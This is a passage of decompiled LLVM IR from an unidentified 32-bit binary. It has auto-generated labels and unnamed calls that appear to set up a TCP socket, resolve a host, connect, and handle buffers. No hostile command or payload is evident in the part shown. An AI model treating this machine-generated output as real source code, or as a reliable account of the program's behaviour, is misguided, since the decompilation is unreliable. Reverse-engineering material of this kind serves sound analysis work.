dec_label_pc_8050faf:                             ; preds = %dec_label_pc_8050fa3, %dec_label_pc_8050f9a
  %v0_8050fa3 = phi i32 [ %v1_8050fa3, %dec_label_pc_8050fa3 ], [ 0, %dec_label_pc_8050f9a ]
  %v0_8050fa4 = phi i32 [ %v1_8050fa4, %dec_label_pc_8050fa3 ], [ %v0_8050f9a, %dec_label_pc_8050f9a ]
  %v3_8050faf = add i32 %v0_8050fa4, 8
  %v4_8050faf = inttoptr i32 %v3_8050faf to i16*
  %v5_8050faf = load i16, i16* %v4_8050faf, align 2
  %v11_8050faf = icmp ult i16 %v1_8050faf, %v5_8050faf
  br i1 %v11_8050faf, label %dec_label_pc_8050fa3, label %dec_label_pc_8050fb5

dec_label_pc_8050fb5:                             ; preds = %dec_label_pc_8050faf
  %v3_8050fb5 = add i32 %v0_8050fa4, 10
  %v4_8050fb5 = inttoptr i32 %v3_8050fb5 to i16*
  %v5_8050fb5 = load i16, i16* %v4_8050fb5, align 2
  %v11_8050fb5 = icmp ult i16 %v1_8050faf, %v5_8050fb5
  %v1_8050fb9 = icmp eq i1 %v11_8050fb5, false
  br i1 %v1_8050fb9, label %dec_label_pc_8050fa3, label %dec_label_pc_8050fbb.loopexit

dec_label_pc_8050fbb.loopexit:                    ; preds = %dec_label_pc_8050fb5
  br label %dec_label_pc_8050fbb

dec_label_pc_8050fbb:                             ; preds = %dec_label_pc_8050fbb.loopexit, %dec_label_pc_8051091
  %v0_8050fbe = phi i32 [ %v0_8050fa4, %dec_label_pc_8050fbb.loopexit ], [ 0, %dec_label_pc_8051091 ]
  %v0_8050fbb = load i32, i32* @edi, align 4
  %v1_8050fbb = add i32 %v0_8050fbb, 4
  %v2_8050fbb = inttoptr i32 %v1_8050fbb to i32*
  %v3_8050fbb = load i32, i32* %v2_8050fbb, align 4
  store i32 %v3_8050fbb, i32* %ecx.global-to-local, align 4
  %v2_8050fbe = inttoptr i32 %v0_8050fbb to i32*
  store i32 %v0_8050fbe, i32* %v2_8050fbe, align 4
  %v0_8050fc0 = load i32, i32* @edi, align 4
  %v1_8050fc0 = add i32 %v0_8050fc0, 24
  %v2_8050fc0 = inttoptr i32 %v1_8050fc0 to i32*
  store i32 0, i32* %v2_8050fc0, align 4
  %v0_80505ca.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80505d2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80505ca

dec_label_pc_8050fcc:                             ; preds = %dec_label_pc_8050f2b
  %v0_8050fcf = load i32, i32* @edi, align 4
  %v1_8050fcf = add i32 %v0_8050fcf, 4
  %v2_8050fcf = inttoptr i32 %v1_8050fcf to i32*
  %v3_8050fcf = load i32, i32* %v2_8050fcf, align 4
  store i32 %v3_8050fcf, i32* %eax.global-to-local, align 4
  %v2_8050fd2 = add i32 %v0_8050f61, 16
  %v3_8050fd2 = inttoptr i32 %v2_8050fd2 to i32*
  store i32 %v3_8050fcf, i32* %v3_8050fd2, align 4
  %v1_8050fd3 = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050fd3, i32* %eax.global-to-local, align 4
  %v0_8050fdb = load i32, i32* @edi, align 4
  %v1_8050fdb = add i32 %v0_8050fdb, 4
  %v2_8050fdb = inttoptr i32 %v1_8050fdb to i32*
  store i32 -1, i32* %v2_8050fdb, align 4
  %v0_8050fe2 = load i32, i32* @edi, align 4
  %v1_8050fe2 = add i32 %v0_8050fe2, 284
  %v2_8050fe2 = inttoptr i32 %v1_8050fe2 to i8*
  store i8 0, i8* %v2_8050fe2, align 1
  %v0_8050fe9 = load i32, i32* @edi, align 4
  %v1_8050fe9 = add i32 %v0_8050fe9, 12
  %v2_8050fe9 = inttoptr i32 %v1_8050fe9 to i32*
  store i32 0, i32* %v2_8050fe9, align 4
  br label %dec_label_pc_80505e1

dec_label_pc_8050ff5:                             ; preds = %dec_label_pc_80504fe
  %v3_8051000 = add nuw nsw i32 %v2_8051000, 1572
  %v4_8051000 = add i32 %v3_8051000, %v0_8051000
  %v5_8051000 = inttoptr i32 %v4_8051000 to i32*
  %v6_8051000 = load i32, i32* %v5_8051000, align 4
  %v9_8051000 = shl i32 1, %v1_8050ffa
  %v12_8051000 = or i32 %v6_8051000, %v9_8051000
  store i32 %v12_8051000, i32* %v5_8051000, align 4
  %v0_8051008 = load i32, i32* @ebx, align 4
  %v1_8051008 = add i32 %v0_8051008, 4
  %v2_8051008 = inttoptr i32 %v1_8051008 to i32*
  %v3_8051008 = load i32, i32* %v2_8051008, align 4
  store i32 %v3_8051008, i32* %eax.global-to-local, align 4
  %v0_805100b = load i32, i32* @esi, align 4
  %v2_805100b = sub i32 %v0_805100b, %v3_8051008
  %v8_805100b = xor i32 %v0_805100b, %v3_8051008
  %v9_805100b = xor i32 %v2_805100b, %v0_805100b
  %v10_805100b = and i32 %v9_805100b, %v8_805100b
  %v11_805100b = icmp slt i32 %v10_805100b, 0
  %v13_805100b = icmp slt i32 %v2_805100b, 0
  %v2_805100d = icmp eq i1 %v13_805100b, %v11_805100b
  br i1 %v2_805100d, label %dec_label_pc_8050521, label %dec_label_pc_8051013

dec_label_pc_8051013:                             ; preds = %dec_label_pc_8050ff5
  store i32 %v3_8051008, i32* @esi, align 4
  br label %dec_label_pc_8050521

dec_label_pc_8051020:                             ; preds = %dec_label_pc_80504ec
  %v0_8051020 = load i32, i32* @esp, align 4
  %v1_8051023 = add i32 %v2_80504de, 4
  %v2_8051023 = inttoptr i32 %v1_8051023 to i32*
  %v3_8051023 = load i32, i32* %v2_8051023, align 4
  store i32 %v3_8051023, i32* %edx.global-to-local, align 4
  %v2_8051026 = add i32 %v0_8051020, -16
  %v3_8051026 = inttoptr i32 %v2_8051026 to i32*
  store i32 %v3_8051023, i32* %v3_8051026, align 4
  %v1_8051027 = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051027, i32* %eax.global-to-local, align 4
  %v0_805102f = load i32, i32* @ebx, align 4
  %v1_805102f = add i32 %v0_805102f, 4
  %v2_805102f = inttoptr i32 %v1_805102f to i32*
  store i32 -1, i32* %v2_805102f, align 4
  %v0_8051036 = load i32, i32* @ebx, align 4
  %v1_8051036 = add i32 %v0_8051036, 12
  %v2_8051036 = inttoptr i32 %v1_8051036 to i32*
  %v3_8051036 = load i32, i32* %v2_8051036, align 4
  %tmp301 = icmp ult i32 %v3_8051036, 3
  br i1 %tmp301, label %dec_label_pc_805106f, label %dec_label_pc_805103c

dec_label_pc_805103c:                             ; preds = %dec_label_pc_8051020
  %v1_805103c = add i32 %v0_8051036, 284
  %v2_805103c = inttoptr i32 %v1_805103c to i8*
  %v3_805103c = load i8, i8* %v2_805103c, align 1
  %v4_805103c = zext i8 %v3_805103c to i32
  %v6_805103c = and i32 %v1_8051027, -256
  %v7_805103c = or i32 %v4_805103c, %v6_805103c
  %v1_8051042 = add i32 %v7_805103c, 1
  %v10_8051042 = trunc i32 %v1_8051042 to i8
  store i32 %v1_8051042, i32* %eax.global-to-local, align 4
  store i8 %v10_8051042, i8* %v2_805103c, align 1
  %v0_8051049 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051049 = trunc i32 %v0_8051049 to i8
  %v10_8051049 = icmp eq i8 %v1_8051049, 10
  %v0_805106f.pre = load i32, i32* @ebx, align 4
  br i1 %v10_8051049, label %dec_label_pc_805106f, label %dec_label_pc_805104d

dec_label_pc_805104d:                             ; preds = %dec_label_pc_805103c
  store i32 %v0_805106f.pre, i32* @eax, align 4
  %v0_805104f = call i32 @function_804f800()
  store i32 %v0_805104f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050521

dec_label_pc_8051060:                             ; preds = %dec_label_pc_8050ea1
  %v0_8051060 = load i32, i32* @edi, align 4
  store i32 %v0_8051060, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_8051065 = call i32 @function_804f800()
  store i32 %v0_8051065, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_805106f:                             ; preds = %dec_label_pc_805103c, %dec_label_pc_8051020
  %v0_805106f = phi i32 [ %v0_8051036, %dec_label_pc_8051020 ], [ %v0_805106f.pre, %dec_label_pc_805103c ]
  %v1_805106f = add i32 %v0_805106f, 284
  %v2_805106f = inttoptr i32 %v1_805106f to i8*
  store i8 0, i8* %v2_805106f, align 1
  %v0_8051076 = load i32, i32* @ebx, align 4
  %v1_8051076 = add i32 %v0_8051076, 12
  %v2_8051076 = inttoptr i32 %v1_8051076 to i32*
  store i32 0, i32* %v2_8051076, align 4
  br label %dec_label_pc_8050521

dec_label_pc_8051082:                             ; preds = %dec_label_pc_80504ce
  br i1 %v5_80504e3, label %dec_label_pc_8050521, label %dec_label_pc_805108a

dec_label_pc_805108a:                             ; preds = %dec_label_pc_8051082
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80504ec

dec_label_pc_8051091.loopexit:                    ; preds = %dec_label_pc_8050fa3
  br label %dec_label_pc_8051091

dec_label_pc_8051091:                             ; preds = %dec_label_pc_8051091.loopexit, %dec_label_pc_8050f6d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fbb

dec_label_pc_8051098:                             ; preds = %dec_label_pc_8050b8c
  %v1_8051098 = add i32 %v0_805067d, 56
  %v2_8051098 = inttoptr i32 %v1_8051098 to i32*
  %v3_8051098 = load i32, i32* %v2_8051098, align 4
  store i32 %v3_8051098, i32* %eax.global-to-local, align 4
  %v1_805109c = inttoptr i32 %v3_8051098 to i32*
  store i32 104, i32* %v1_805109c, align 4
  %v0_8050ba8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050ba8

dec_label_pc_80510a7:                             ; preds = %dec_label_pc_8050ba8
  store i32 %v0_80510a7, i32* @eax, align 4
  %v0_80510a9 = call i32 @function_804f800()
  store i32 %v0_80510a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505e1

dec_label_pc_80510b3:                             ; preds = %dec_label_pc_8050b5e
  %v11_80510b3 = icmp eq i8 %v2_8050b5e, -5
  %v1_80510b5 = icmp eq i1 %v11_80510b3, false
  br i1 %v1_80510b5, label %dec_label_pc_80506f3, label %dec_label_pc_80510bb

dec_label_pc_80510bb:                             ; preds = %dec_label_pc_80510b3
  store i8 -3, i8* %v1_8050b5e, align 1
  %v4_80506f3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506f3

dec_label_pc_80510de:                             ; preds = %dec_label_pc_805095c
  %v1_80510de = add i32 %v0_8050977, 1
  %v8_80510de = icmp eq i32 %v1_80510de, 0
  store i32 %v1_80510de, i32* %eax.global-to-local, align 4
  br i1 %v8_80510de, label %dec_label_pc_8050984, label %dec_label_pc_80510e5

dec_label_pc_80510e5:                             ; preds = %dec_label_pc_80510de
  %v0_80510e5 = load i32, i32* @ecx, align 4
  %v1_80510e5 = load i32, i32* @esp, align 4
  %v2_80510e5 = add i32 %v1_80510e5, -4
  %v3_80510e5 = inttoptr i32 %v2_80510e5 to i32*
  store i32 %v0_80510e5, i32* %v3_80510e5, align 4
  %v1_80510e6 = add i32 %v1_80510e5, -8
  %v2_80510e6 = inttoptr i32 %v1_80510e6 to i32*
  store i32 0, i32* %v2_80510e6, align 4
  %v1_80510e8 = add i32 %v1_80510e5, -12
  %v2_80510e8 = inttoptr i32 %v1_80510e8 to i32*
  store i32 1, i32* %v2_80510e8, align 4
  %v1_80510ea = add i32 %v1_80510e5, -16
  %v2_80510ea = inttoptr i32 %v1_80510ea to i32*
  store i32 2, i32* %v2_80510ea, align 4
  %v3_80510ec = call i32 @function_8052a35(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_80510f1 = load i32, i32* @esp, align 4
  %v2_80510f1 = add i32 %v1_80510f1, 48
  %v3_80510f1 = inttoptr i32 %v2_80510f1 to i32*
  store i32 %v3_80510ec, i32* %v3_80510f1, align 4
  %v0_80510f5 = load i32, i32* @esp, align 4
  %v1_80510f8 = add i32 %v3_80510ec, 1
  %v8_80510f8 = icmp eq i32 %v1_80510f8, 0
  store i32 %v1_80510f8, i32* @eax, align 4
  %v2_8050347 = inttoptr i32 %v0_80510f5 to i32*
  br i1 %v8_80510f8, label %dec_label_pc_8050344, label %dec_label_pc_80510ff

dec_label_pc_80510ff:                             ; preds = %dec_label_pc_80510e5
  store i32 18, i32* %v2_8050347, align 4
  %v2_8051104 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051104, i32* %eax.global-to-local, align 4
  %v0_8051109 = load i32, i32* @esp, align 4
  %v1_8051109 = inttoptr i32 %v0_8051109 to i32*
  store i32 19, i32* %v1_8051109, align 4
  %v2_8051110 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051110, i32* %eax.global-to-local, align 4
  %v0_8051115 = load i32, i32* @esp, align 4
  %v1_8051115 = inttoptr i32 %v0_8051115 to i32*
  %v2_8051115 = load i32, i32* %v1_8051115, align 4
  store i32 %v2_8051115, i32* %eax.global-to-local, align 4
  %v3_8051115 = add i32 %v0_8051115, 4
  %v1_8051116 = inttoptr i32 %v3_8051115 to i32*
  %v2_8051116 = load i32, i32* %v1_8051116, align 4
  store i32 %v2_8051116, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051116, align 4
  store i32 18, i32* %v1_8051115, align 4
  %v3_805111b = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805111b, i32* %eax.global-to-local, align 4
  %v1_8051120 = load i32, i32* @esp, align 4
  %v2_8051120 = inttoptr i32 %v1_8051120 to i32*
  store i32 %v3_805111b, i32* %v2_8051120, align 4
  %v2_8051123 = call i32 @function_804f340(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_8051123, i32* %eax.global-to-local, align 4
  %v0_8051128 = load i32, i32* @esp, align 4
  store i32 %v2_8051123, i32* @esi, align 4
  %v2_805112d = icmp eq i32 %v2_8051123, 0
  br i1 %v2_805112d, label %dec_label_pc_8050984, label %dec_label_pc_8051135

dec_label_pc_8051135:                             ; preds = %dec_label_pc_80510ff
  %v1_8051135 = add i32 %v0_8051128, 1844
  %v2_8051135 = inttoptr i32 %v1_8051135 to i16*
  store i16 2, i16* %v2_8051135, align 2
  %v2_805113f = add i32 %v2_8051123, 4
  %v3_805113f = inttoptr i32 %v2_805113f to i32*
  %v4_805113f = load i32, i32* %v3_805113f, align 4
  store i32 %v4_805113f, i32* @ebx, align 4
  %v1_8051142 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_8051142 = sext i32 %v1_8051142 to i64
  store i32 %v1_8051142, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051149 = load i32, i32* @esi, align 4
  %v1_8051149 = inttoptr i32 %v0_8051149 to i8*
  %v2_8051149 = load i8, i8* %v1_8051149, align 1
  %v3_8051149 = zext i8 %v2_8051149 to i32
  store i32 %v3_8051149, i32* %ecx.global-to-local, align 4
  %v8_805114f = zext i8 %v2_8051149 to i64
  %v9_805114f = udiv i64 %v2_8051142, %v8_805114f
  %v10_805114f = trunc i64 %v9_805114f to i32
  store i32 %v10_805114f, i32* %eax.global-to-local, align 4
  %v11_805114f = urem i64 %v2_8051142, %v8_805114f
  %v12_805114f = trunc i64 %v11_805114f to i32
  store i32 %v12_805114f, i32* %edx.global-to-local, align 4
  %v0_8051151 = load i32, i32* @ebx, align 4
  %v2_8051151 = mul nuw nsw i32 %v12_805114f, 4
  %v3_8051151 = add i32 %v2_8051151, %v0_8051151
  %v4_8051151 = inttoptr i32 %v3_8051151 to i32*
  %v5_8051151 = load i32, i32* %v4_8051151, align 4
  store i32 %v5_8051151, i32* %eax.global-to-local, align 4
  %v1_8051154 = load i32, i32* @esp, align 4
  %v2_8051154 = add i32 %v1_8051154, 1832
  %v3_8051154 = inttoptr i32 %v2_8051154 to i32*
  store i32 %v5_8051151, i32* %v3_8051154, align 4
  %v0_805115b = load i32, i32* @edi, align 4
  %v1_805115b = load i32, i32* @esp, align 4
  %v2_805115b = add i32 %v1_805115b, -4
  %v3_805115b = inttoptr i32 %v2_805115b to i32*
  store i32 %v0_805115b, i32* %v3_805115b, align 4
  %v0_805115c = load i32, i32* @edi, align 4
  %v2_805115c = add i32 %v1_805115b, -8
  %v3_805115c = inttoptr i32 %v2_805115c to i32*
  store i32 %v0_805115c, i32* %v3_805115c, align 4
  %v1_805115d = add i32 %v1_805115b, -12
  %v2_805115d = inttoptr i32 %v1_805115d to i32*
  store i32 0, i32* %v2_805115d, align 4
  %v1_805115f = add i32 %v1_805115b, -16
  %v2_805115f = inttoptr i32 %v1_805115f to i32*
  store i32 19, i32* %v2_805115f, align 4
  %v3_8051161 = call i32 @function_80512a0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8051161 = inttoptr i32 %v3_8051161 to i16*
  store i32 %v3_8051161, i32* %eax.global-to-local, align 4
  %v3_8051166 = load i16, i16* %v4_8051161, align 2
  %v4_8051166 = zext i16 %v3_8051166 to i32
  %v7_8051166 = and i32 %v3_8051161, -65536
  %v8_8051166 = or i32 %v4_8051166, %v7_8051166
  store i32 %v8_8051166, i32* %eax.global-to-local, align 4
  %v0_8051169 = load i32, i32* @esi, align 4
  %v1_8051169 = load i32, i32* @esp, align 4
  %v2_8051169 = inttoptr i32 %v1_8051169 to i32*
  store i32 %v0_8051169, i32* %v2_8051169, align 4
  %v0_805116c = load i32, i32* %eax.global-to-local, align 4
  %v1_805116c = trunc i32 %v0_805116c to i16
  %v2_805116c = load i32, i32* @esp, align 4
  %v3_805116c = add i32 %v2_805116c, 1846
  %v4_805116c = inttoptr i32 %v3_805116c to i16*
  store i16 %v1_805116c, i16* %v4_805116c, align 2
  %v1_8051174 = call i32 @function_804f300(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051174, i32* %eax.global-to-local, align 4
  %v0_8051179 = load i32, i32* @esp, align 4
  %v1_8051179 = inttoptr i32 %v0_8051179 to i32*
  store i32 18, i32* %v1_8051179, align 4
  %v2_8051180 = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051180, i32* %eax.global-to-local, align 4
  %v0_8051185 = load i32, i32* @esp, align 4
  %v1_8051185 = inttoptr i32 %v0_8051185 to i32*
  store i32 19, i32* %v1_8051185, align 4
  %v2_805118c = call i32 @function_80512d0(i8 ptrtoint (i32* @0 to i8))
  %v0_8051191 = load i32, i32* @esp, align 4
  %v1_8051191 = add i32 %v0_8051191, 1844
  store i32 %v1_8051191, i32* %eax.global-to-local, align 4
  %v1_805119b = add i32 %v0_8051191, 8
  %v2_805119b = inttoptr i32 %v1_805119b to i32*
  store i32 16, i32* %v2_805119b, align 4
  %v0_805119d = load i32, i32* %eax.global-to-local, align 4
  %v2_805119d = add i32 %v0_8051191, 4
  %v3_805119d = inttoptr i32 %v2_805119d to i32*
  store i32 %v0_805119d, i32* %v3_805119d, align 4
  %v1_805119e = add i32 %v0_8051191, 48
  %v2_805119e = inttoptr i32 %v1_805119e to i32*
  %v3_805119e = load i32, i32* %v2_805119e, align 4
  store i32 %v3_805119e, i32* %esi.global-to-local, align 4
  %v3_80511a2 = inttoptr i32 %v0_8051191 to i32*
  store i32 %v3_805119e, i32* %v3_80511a2, align 4
  %v3_80511a3 = call i32 @function_805285a(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80511a8 = load i32, i32* @esp, align 4
  %v1_80511a8 = add i32 %v0_80511a8, 16
  %v1_80511ab = add i32 %v3_80511a3, 1
  %v8_80511ab = icmp eq i32 %v1_80511ab, 0
  store i32 %v1_80511ab, i32* %eax.global-to-local, align 4
  %v1_80511ac = icmp eq i1 %v8_80511ab, false
  br i1 %v1_80511ac, label %dec_label_pc_80511c7, label %dec_label_pc_80511ae

dec_label_pc_80511ae:                             ; preds = %dec_label_pc_8051135
  br label %dec_label_pc_80511b1

dec_label_pc_80511b1:                             ; preds = %dec_label_pc_80511c7, %dec_label_pc_80511ae
  %storemerge4.in = phi i32 [ %v0_80511a8, %dec_label_pc_80511ae ], [ %v0_805128e, %dec_label_pc_80511c7 ]
  %v1_80511b1 = add i32 %storemerge4.in, 48
  %v2_80511b1 = inttoptr i32 %v1_80511b1 to i32*
  %v3_80511b1 = load i32, i32* %v2_80511b1, align 4
  store i32 %v3_80511b1, i32* @edi, align 4
  %v3_80511b5 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_80511b1, i32* %v3_80511b5, align 4
  %v1_80511b6 = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80511b6, i32* @eax, align 4
  %v0_80511bb = load i32, i32* @esp, align 4
  %v1_80511bb = inttoptr i32 %v0_80511bb to i32*
  store i32 0, i32* %v1_80511bb, align 4
  %v1_80511c2 = call i32 @function_8053d89(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80511c2, i32* %eax.global-to-local, align 4
  %v0_80511c7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511c7

dec_label_pc_80511c7:                             ; preds = %dec_label_pc_8051135, %dec_label_pc_80511b1
  %v0_80511c7 = phi i32 [ %v1_80511a8, %dec_label_pc_8051135 ], [ %v0_80511c7.pre, %dec_label_pc_80511b1 ]
  %v1_80511c7 = add i32 %v0_80511c7, 1864
  %v2_80511c7 = inttoptr i32 %v1_80511c7 to i8*
  store i8 0, i8* %v2_80511c7, align 1
  %v0_80511cf = load i32, i32* @esp, align 4
  %v1_80511cf = add i32 %v0_80511cf, -4
  %v2_80511cf = inttoptr i32 %v1_80511cf to i32*
  store i32 16384, i32* %v2_80511cf, align 4
  %v1_80511d4 = add i32 %v0_80511cf, -8
  %v2_80511d4 = inttoptr i32 %v1_80511d4 to i32*
  store i32 1, i32* %v2_80511d4, align 4
  %v1_80511d6 = add i32 %v0_80511cf, 1864
  store i32 %v1_80511d6, i32* %eax.global-to-local, align 4
  %v2_80511dd = add i32 %v0_80511cf, -12
  %v3_80511dd = inttoptr i32 %v2_80511dd to i32*
  store i32 %v1_80511d6, i32* %v3_80511dd, align 4
  %v1_80511de = add i32 %v0_80511cf, 32
  %v2_80511de = inttoptr i32 %v1_80511de to i32*
  %v3_80511de = load i32, i32* %v2_80511de, align 4
  store i32 %v3_80511de, i32* @ebx, align 4
  %v2_80511e2 = add i32 %v0_80511cf, -16
  %v3_80511e2 = inttoptr i32 %v2_80511e2 to i32*
  store i32 %v3_80511de, i32* %v3_80511e2, align 4
  %v0_80511e3 = call i32 @function_8052984()
  %v0_80511e8 = load i32, i32* @esp, align 4
  %v1_80511e8 = add i32 %v0_80511e8, -4
  %v2_80511e8 = inttoptr i32 %v1_80511e8 to i32*
  store i32 16384, i32* %v2_80511e8, align 4
  %v1_80511ed = add i32 %v0_80511e8, -8
  %v2_80511ed = inttoptr i32 %v1_80511ed to i32*
  store i32 4, i32* %v2_80511ed, align 4
  %v1_80511ef = add i32 %v0_80511e8, 1888
  store i32 %v1_80511ef, i32* %eax.global-to-local, align 4
  %v2_80511f6 = add i32 %v0_80511e8, -12
  %v3_80511f6 = inttoptr i32 %v2_80511f6 to i32*
  store i32 %v1_80511ef, i32* %v3_80511f6, align 4
  %v1_80511f7 = add i32 %v0_80511e8, 48
  %v2_80511f7 = inttoptr i32 %v1_80511f7 to i32*
  %v3_80511f7 = load i32, i32* %v2_80511f7, align 4
  store i32 %v3_80511f7, i32* %ecx.global-to-local, align 4
  %v2_80511fb = add i32 %v0_80511e8, -16
  %v3_80511fb = inttoptr i32 %v2_80511fb to i32*
  store i32 %v3_80511f7, i32* %v3_80511fb, align 4
  %v0_80511fc = call i32 @function_8052984()
  %v0_8051201 = load i32, i32* @esp, align 4
  %v1_8051204 = add i32 %v0_8051201, 28
  %v2_8051204 = inttoptr i32 %v1_8051204 to i32*
  store i32 16384, i32* %v2_8051204, align 4
  %v1_8051209 = add i32 %v0_8051201, 24
  %v2_8051209 = inttoptr i32 %v1_8051209 to i32*
  store i32 2, i32* %v2_8051209, align 4
  %v1_805120b = add i32 %v0_8051201, 1914
  store i32 %v1_805120b, i32* %eax.global-to-local, align 4
  %v2_8051212 = add i32 %v0_8051201, 20
  %v3_8051212 = inttoptr i32 %v2_8051212 to i32*
  store i32 %v1_805120b, i32* %v3_8051212, align 4
  %v1_8051213 = add i32 %v0_8051201, 64
  %v2_8051213 = inttoptr i32 %v1_8051213 to i32*
  %v3_8051213 = load i32, i32* %v2_8051213, align 4
  store i32 %v3_8051213, i32* %edx.global-to-local, align 4
  %v2_8051217 = add i32 %v0_8051201, 16
  %v3_8051217 = inttoptr i32 %v2_8051217 to i32*
  store i32 %v3_8051213, i32* %v3_8051217, align 4
  %v0_8051218 = call i32 @function_8052984()
  store i32 %v0_8051218, i32* %eax.global-to-local, align 4
  %v0_805121d = load i32, i32* @esp, align 4
  %v1_805121d = add i32 %v0_805121d, -4
  %v2_805121d = inttoptr i32 %v1_805121d to i32*
  store i32 16384, i32* %v2_805121d, align 4
  %v1_8051222 = add i32 %v0_805121d, -8
  %v2_8051222 = inttoptr i32 %v1_8051222 to i32*
  store i32 1, i32* %v2_8051222, align 4
  %v1_8051224 = add i32 %v0_805121d, 52
  %v2_8051224 = inttoptr i32 %v1_8051224 to i32*
  %v3_8051224 = load i32, i32* %v2_8051224, align 4
  %v1_8051228 = add i32 %v3_8051224, 12
  store i32 %v1_8051228, i32* %eax.global-to-local, align 4
  %v2_805122b = add i32 %v0_805121d, -12
  %v3_805122b = inttoptr i32 %v2_805122b to i32*
  store i32 %v1_8051228, i32* %v3_805122b, align 4
  %v1_805122c = add i32 %v0_805121d, 48
  %v2_805122c = inttoptr i32 %v1_805122c to i32*
  %v3_805122c = load i32, i32* %v2_805122c, align 4
  store i32 %v3_805122c, i32* %eax.global-to-local, align 4
  %v2_8051230 = add i32 %v0_805121d, -16
  %v3_8051230 = inttoptr i32 %v2_8051230 to i32*
  store i32 %v3_805122c, i32* %v3_8051230, align 4
  %v0_8051231 = call i32 @function_8052984()
  %v0_8051236 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805123b = add i32 %v0_8051236, 28
  %v2_805123b = inttoptr i32 %v1_805123b to i32*
  store i32 16384, i32* %v2_805123b, align 4
  %v1_8051240 = add i32 %v0_8051236, 68
  %v2_8051240 = inttoptr i32 %v1_8051240 to i32*
  %v3_8051240 = load i32, i32* %v2_8051240, align 4
  store i32 %v3_8051240, i32* %edx.global-to-local, align 4
  %v1_8051244 = add i32 %v3_8051240, 12
  %v2_8051244 = inttoptr i32 %v1_8051244 to i8*
  %v3_8051244 = load i8, i8* %v2_8051244, align 1
  %v4_8051244 = zext i8 %v3_8051244 to i32
  %v5_8051244 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051244 = and i32 %v5_8051244, -256
  %v7_8051244 = or i32 %v6_8051244, %v4_8051244
  store i32 %v7_8051244, i32* %eax.global-to-local, align 4
  %v2_8051247 = add i32 %v0_8051236, 24
  %v3_8051247 = inttoptr i32 %v2_8051247 to i32*
  store i32 %v7_8051244, i32* %v3_8051247, align 4
  %v0_8051248 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051248 = inttoptr i32 %v0_8051248 to i32*
  %v2_8051248 = load i32, i32* %v1_8051248, align 4
  store i32 %v2_8051248, i32* %eax.global-to-local, align 4
  %v2_805124a = add i32 %v0_8051236, 20
  %v3_805124a = inttoptr i32 %v2_805124a to i32*
  store i32 %v2_8051248, i32* %v3_805124a, align 4
  %v1_805124b = add i32 %v0_8051236, 64
  %v2_805124b = inttoptr i32 %v1_805124b to i32*
  %v3_805124b = load i32, i32* %v2_805124b, align 4
  store i32 %v3_805124b, i32* %eax.global-to-local, align 4
  %v2_805124f = add i32 %v0_8051236, 16
  %v3_805124f = inttoptr i32 %v2_805124f to i32*
  store i32 %v3_805124b, i32* %v3_805124f, align 4
  %v0_8051250 = call i32 @function_8052984()
  store i32 %v0_8051250, i32* %eax.global-to-local, align 4
  %v0_8051255 = load i32, i32* @esp, align 4
  %v1_8051255 = add i32 %v0_8051255, -4
  %v2_8051255 = inttoptr i32 %v1_8051255 to i32*
  store i32 16384, i32* %v2_8051255, align 4
  %v1_805125a = add i32 %v0_8051255, -8
  %v2_805125a = inttoptr i32 %v1_805125a to i32*
  store i32 1, i32* %v2_805125a, align 4
  %v1_805125c = add i32 %v0_8051255, 52
  %v2_805125c = inttoptr i32 %v1_805125c to i32*
  %v3_805125c = load i32, i32* %v2_805125c, align 4
  %v1_8051260 = add i32 %v3_805125c, 13
  store i32 %v1_8051260, i32* %eax.global-to-local, align 4
  %v2_8051263 = add i32 %v0_8051255, -12
  %v3_8051263 = inttoptr i32 %v2_8051263 to i32*
  store i32 %v1_8051260, i32* %v3_8051263, align 4
  %v1_8051264 = add i32 %v0_8051255, 48
  %v2_8051264 = inttoptr i32 %v1_8051264 to i32*
  %v3_8051264 = load i32, i32* %v2_8051264, align 4
  store i32 %v3_8051264, i32* %eax.global-to-local, align 4
  %v2_8051268 = add i32 %v0_8051255, -16
  %v3_8051268 = inttoptr i32 %v2_8051268 to i32*
  store i32 %v3_8051264, i32* %v3_8051268, align 4
  %v0_8051269 = call i32 @function_8052984()
  %v0_805126e = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051273 = add i32 %v0_805126e, 28
  %v2_8051273 = inttoptr i32 %v1_8051273 to i32*
  store i32 16384, i32* %v2_8051273, align 4
  %v1_8051278 = add i32 %v0_805126e, 68
